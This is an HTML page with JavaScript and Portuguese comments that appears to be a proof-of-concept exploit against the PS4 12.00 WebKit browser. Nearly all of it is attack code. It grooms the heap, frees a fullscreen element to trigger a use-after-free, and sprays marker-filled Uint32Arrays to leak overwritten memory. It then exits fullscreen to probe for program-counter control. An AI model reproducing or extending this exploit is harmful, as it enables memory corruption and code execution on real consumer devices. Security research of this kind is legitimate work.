<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - ArrayBuffer Overlap Leak</title>
<style>
    body { font-family: monospace; background-color: #111; color: #0f0; padding: 20px; font-size: 16px;}
    #log { margin-top: 20px; white-space: pre-wrap; }
    .leak { color: #ff00ff; font-weight: bold; font-size: 20px;}
</style>
</head>
<body>

<h2>PS4 12.00 - Info Leak via Overlap</h2>
<button onclick="runTest()" style="padding: 15px; font-size: 16px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0;">Iniciar Varredura de Heap</button>
<div id="log">Aguardando...</div>

<script>
// Usaremos um marcador bem óbvio em hexadecimal: 0xBBBBBBBB (3149642683 em decimal)
const MARKER = 3149642683; 

function runTest() {
    const log = document.getElementById("log");
    log.innerHTML = "Preparando alocações...<br><b>Pressione OPTIONS agora!</b>";

    let controllers = [];

    // Passo 1: Heap Grooming
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Buscando Overlap...<br>Aperte OPTIONS</h1>";
    fsTarget.style.backgroundColor = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";
    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    }

    window.onblur = function() {
        log.innerHTML += "<br>[*] Foco perdido. Removendo elemento (Free)...";

        // Força GC para limpar o fsTarget
        controllers = null;
        for (let i = 0; i < 20000; i++) {
            new ArrayBuffer(0x10000);
        }

        // Gatilho do UAF
        fsTarget.remove(); 
        
        log.innerHTML += "<br>[*] Substituindo memória com Uint32Arrays (Spray)...";
        
        // NOVO SPRAY: Em vez de Float64 puros, usamos Uint32Array reais
        let spray = [];
        for(let i = 0; i < 10000; i++) {
            // Arrays com 16 slots (64 bytes), tamanho comum de objetos de Renderização
            let p = new Uint32Array(16); 
            p.fill(MARKER);
            spray.push(p);
        }

        // Esperamos um instante para o WebKit "respirar" e atualizar os ponteiros internos
        setTimeout(() => {
            log.innerHTML += "<br>[*] Varrendo ArrayBuffers em busca de corrupção...";
            
            let leakEncontrado = false;

            // Inspecionamos todos os nossos Arrays
            for (let i = 0; i < spray.length; i++) {
                for (let j = 0; j < spray[i].length; j++) {
                    let valor = spray[i][j];
                    
                    // Se o valor não for o nosso MARKER, o WebKit escreveu por cima!
                    if (valor !== MARKER) {
                        log.innerHTML += `<br><span class="leak">[!!!] OVERLAP DETECTADO no Array [${i}], Índice [${j}]!</span>`;
                        log.innerHTML += `<br><span class="leak">[!!!] Valor vazado: 0x${valor.toString(16).padStart(8, '0')}</span>`;
                        leakEncontrado = true;
                        
                        // Quebra o loop interno para não flodar a tela
                        break; 
                    }
                }
                if (leakEncontrado) break;
            }

            if (!leakEncontrado) {
                log.innerHTML += `<br>[-] Nenhum dado C++ vazado nos buffers. A memória permaneceu intacta.`;
            }

            log.innerHTML += `<br>[*] Forçando a saída do Fullscreen para verificar controle de PC...`;
            
            // Agora chamamos a saída do fullscreen. 
            // Se der tela azul, significa que o WebKit LEU o nosso MARKER e tentou pular para o endereço 0xBBBBBBBB!
            setTimeout(() => {
                if (document.webkitIsFullScreen || document.fullscreenElement) {
                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
                }
            }, 2000);

        }, 1500);
    };
}
</script>

</body>
</html>
